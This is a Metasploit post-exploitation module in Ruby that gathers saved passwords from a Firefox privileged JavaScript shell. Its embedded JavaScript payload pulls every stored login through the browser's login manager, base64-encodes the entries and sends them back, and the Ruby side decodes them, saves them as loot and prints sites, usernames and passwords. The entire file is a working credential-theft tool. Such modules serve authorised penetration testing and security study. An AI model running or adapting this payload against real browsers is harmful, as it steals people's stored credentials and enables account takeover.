##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'
require 'msf/core'
require 'msf/core/payload/firefox'

class Metasploit3 < Msf::Post

  include Msf::Payload::Firefox
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Firefox Gather Passwords from Privileged Javascript Shell',
      'Description'   => %q{
        This module allows collection of passwords from a Firefox Privileged Javascript Shell.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev' ],
      'DisclosureDate' => 'Apr 11 2014'
    ))

    register_options([
      OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
    ], self.class)
  end

  # Takes the passwords JSON file and prints it nicely
  # Password entries look like this:
  # {"password"=>"somepassword", "passwordField"=>"passwd", "username"=>"", "usernameField"=>"email",
  # "httpRealm"=>"", "formSubmitURL"=>"https://ssl.reddit.com", "hostname"=>"http://www.example.com"}
  def print_json(passwords)
    tbl = Rex::Ui::Text::Table.new(
      'Header'  => 'Saved Firefox Passwords',
      'Indent'  => 4,
      'Columns' => [ 'Site','Username', 'Password' ]
    )
    passwords_json = passwords.to_json

    passwords.each do |cred|
      username = cred["username"]
      password = cred["password"]
      site     = cred["hostname"]
      tbl << [site, username, password]
    end

    tbl.sort_rows(0)
    print_line tbl.to_s
  end


  def run
    results = js_exec(js_payload)
    if results.present?
      begin
        passwords = JSON.parse(results)
        passwords.each do |entry|
          entry.keys.each { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
        end

        file = store_loot("firefox.passwords.json", "text/json", rhost, passwords.to_json)
        print_good("Saved #{passwords.length} passwords to #{file}")
        if datastore['VERBOSE']
          print_json(passwords)
        end
      rescue JSON::ParserError => e
        print_warning(results)
      end
    end
  end

  def js_payload
    %Q|
      (function(send){
        try {
          var manager = Components
                          .classes["@mozilla.org/login-manager;1"]
                          .getService(Components.interfaces.nsILoginManager);
          var logins = manager.getAllLogins();
          var passwords = [];
          var b64 = Components.utils.import("resource://gre/modules/Services.jsm").btoa;
          var fields = ['password', 'passwordField', 'username', 'usernameField',
                        'httpRealm', 'formSubmitURL', 'hostname'];

          var sanitize = function(passwdObj) {
            var sanitized = { };
            for (var i in fields) {
              sanitized[fields[i]] = b64(passwdObj[fields[i]]);
            }
            return sanitized;
          }

          // Find user from returned array of nsILoginInfo objects
          for (var i = 0; i < logins.length; i++) {
            passwords.push(sanitize(logins[i]));
          }

          send(JSON.stringify(passwords));
        } catch (e) {
          send(e);
        }
      })(send);
    |.strip
  end
end
